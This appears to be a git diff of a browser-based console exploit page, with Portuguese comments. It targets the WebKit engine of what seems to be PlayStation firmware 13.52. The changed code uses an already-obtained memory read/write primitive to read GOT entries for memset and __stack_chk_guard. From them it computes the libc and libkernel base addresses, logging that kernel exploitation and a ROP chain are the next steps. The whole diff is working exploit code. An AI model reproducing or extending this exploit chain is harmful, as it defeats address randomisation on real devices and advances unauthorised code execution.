@@ -444,66 +444,89 @@ async function main() {
     log('[+] WebKit Base calculada: 0x' + webkitBase.toString(16), 'ok');
     setCard('c-wk', '0x' + webkitBase.toString(16));
 
-    setTimeout(async () => {
-      // ─── Resolver bases via ELF parsing ───
-      const result = await resolveAllBases(p, webkitBase);
-      if (!result) {
-        setStatus('Falha na resolução de bases', 'e');
+    // ─── Trecho mínimo: bases via GOT/import (sem parse ELF) ───
+    // Não chama resolveAllBases — evita crash ao ler loadBase como ELF.
+    setTimeout(function () {
+      logH('BASES VIA IMPORT (mínimo)');
+
+      // Aliases da API real do mem.js
+      var read4 = p.read4 || p.read32;
+      var read8 = p.read8 || p.read64;
+      if (!read4 || !read8) {
+        log('[-] API de leitura indisponível (read4/read8)', 'e');
+        setStatus('API R/W incompleta', 'e');
         return;
       }
 
-      imports = result.imports;
-      const libKernelBase = result.libkernelBase;
-      const libcBase = result.libcBase;
+      var off_memset_imp = (typeof OFFSET_wk_memset_import !== 'undefined') ? OFFSET_wk_memset_import : 0;
+      var off_guard_imp  = (typeof OFFSET_wk___stack_chk_guard_import !== 'undefined') ? OFFSET_wk___stack_chk_guard_import : 0;
+      var off_lc_memset  = (typeof OFFSET_lc_memset !== 'undefined') ? OFFSET_lc_memset : 0;
+      var off_lk_guard   = (typeof OFFSET_lk___stack_chk_guard !== 'undefined') ? OFFSET_lk___stack_chk_guard : 0;
 
-      // ─── Validar bases ───
-      const valid = await validateBases(p, libKernelBase, libcBase);
+      log('[*] OFFSET_wk_memset_import          = 0x' + off_memset_imp.toString(16));
+      log('[*] OFFSET_wk___stack_chk_guard_import = 0x' + off_guard_imp.toString(16));
+      log('[*] OFFSET_lc_memset                 = 0x' + off_lc_memset.toString(16));
+      log('[*] OFFSET_lk___stack_chk_guard      = 0x' + off_lk_guard.toString(16));
 
-      if (!valid.libkernel) {
-        setCard('c-lk', 'Falha na validação');
-        log('[-] libkernel base não passou na validação', 'e');
+      if (!off_memset_imp || !off_lc_memset) {
+        log('[!] Offsets de libc ainda em 0 — preencha no 13.52.js', 'w');
       }
-      if (!valid.libc) {
-        setCard('c-lc', 'Falha na validação');
-        log('[-] libc base não passou na validação', 'e');
+      if (!off_guard_imp || !off_lk_guard) {
+        log('[!] Offsets de libkernel ainda em 0 — preencha no 13.52.js', 'w');
       }
 
-      if (valid.libkernel) {
+      var libcBase = null;
+      var libKernelBase = null;
+
+      // libc: GOT memset → função → subtrai offset
+      if (off_memset_imp && off_lc_memset) {
         try {
-          const notif = prepareNotification(p, libKernelBase, imports, 'Hello World from PS4 13.52!');
-          if (notif) {
-            setCard('c-g', 'Pronto');
-            setStatus('Buffer de notificação pronto!', 'ok');
-            log('[✓] Configuração de notificação concluída com sucesso.', 'ok');
-
-            const cbox = document.getElementById('cbox');
-            cbox.style.display = 'block';
-            document.getElementById('c-out').textContent =
-                'WebKit Base     = 0x' + webkitBase.toString(16) + '\n' +
-                'libkernel Base  = 0x' + (libKernelBase ? libKernelBase.toString(16) : 'N/A') + '\n' +
-                'libSceLibc Base = ' + (libcBase ? '0x' + libcBase.toString(16) : 'N/A') + '\n' +
-                'Buffer Notif    = 0x' + notif.requestBuffer.toString(16) + '\n' +
-                'Função Target   = 0x' + notif.notifyFunc.toString(16) + '\n' +
-                'Notify Offset   = 0x' + (imports['sceKernelSendNotificationRequest'] ? imports['sceKernelSendNotificationRequest'].wkOffset.toString(16) : 'N/A');
-
-            // ─── NOTIFICAÇÃO: stub honesto (sem simulação) ───
-            logH('NOTIFICAÇÃO');
-            log('[+] Offset dinâmico de sceKernelSendNotificationRequest: 0x' + imports['sceKernelSendNotificationRequest'].wkOffset.toString(16), 'i');
-            log('[!] Execução nativa requer ROP chain ou JIT pivot (não implementado)', 'w');
-            log('[!] Status: userland R/W ativo. Kernel exploit necessário para execução real.', 'w');
-
-          } else {
-            setCard('c-g', 'Falha');
-            log('[-] Falha ao preparar buffer de notificação', 'e');
-          }
+          var slot = webkitBase.add32(off_memset_imp);
+          var ptr = read8(slot);
+          log('[+] GOT memset @ wk+0x' + off_memset_imp.toString(16) + ' → 0x' + ptr.toString(16), 'ok');
+          libcBase = ptr.sub32(off_lc_memset);
+          log('[+] libcBase = 0x' + libcBase.toString(16), 'ok');
+          setCard('c-lc', '0x' + libcBase.toString(16));
         } catch (e) {
-          log('[-] Erro ao preparar buffer: ' + e.message, 'e');
+          log('[-] Falha ao ler GOT memset: ' + (e && e.message ? e.message : e), 'e');
         }
-      } else {
-        setCard('c-g', 'Falha LK');
-        log('[-] Não foi possível resolver a libkernel para o buffer.', 'e');
       }
-    }, 1000);
+
+      // libkernel: GOT __stack_chk_guard → subtrai offset
+      if (off_guard_imp && off_lk_guard) {
+        try {
+          var slot2 = webkitBase.add32(off_guard_imp);
+          var ptr2 = read8(slot2);
+          log('[+] GOT __stack_chk_guard @ wk+0x' + off_guard_imp.toString(16) + ' → 0x' + ptr2.toString(16), 'ok');
+          libKernelBase = ptr2.sub32(off_lk_guard);
+          log('[+] libkernelBase = 0x' + libKernelBase.toString(16), 'ok');
+          setCard('c-lk', '0x' + libKernelBase.toString(16));
+        } catch (e) {
+          log('[-] Falha ao ler GOT guard: ' + (e && e.message ? e.message : e), 'e');
+        }
+      }
+
+      var cbox = document.getElementById('cbox');
+      cbox.style.display = 'block';
+      document.getElementById('c-out').textContent =
+          'WebKit Base    = 0x' + webkitBase.toString(16) + '\n' +
+          'libkernel Base = ' + (libKernelBase ? '0x' + libKernelBase.toString(16) : '(offsets 0 — pendente)') + '\n' +
+          'libSceLibc Base= ' + (libcBase ? '0x' + libcBase.toString(16) : '(offsets 0 — pendente)') + '\n' +
+          '\nSem parse ELF. Preencha no 13.52.js:\n' +
+          '  OFFSET_wk_memset_import\n' +
+          '  OFFSET_wk___stack_chk_guard_import\n' +
+          '  OFFSET_lc_memset\n' +
+          '  OFFSET_lk___stack_chk_guard';
+
+      if (libcBase || libKernelBase) {
+        setStatus('Bases parciais resolvidas via GOT', 'ok');
+        setCard('c-g', 'GOT ok');
+      } else {
+        setStatus('Aguardando offsets no 13.52.js', 'w');
+        setCard('c-g', 'offsets=0');
+        log('[!] R/W + WebKit base OK. Próximo: achar os 4 offsets offline.', 'w');
+      }
+    }, 500);
 
   } else {
     log('[-] Falha: __ps5NativeCtor não foi capturado corretamente.', 'e');
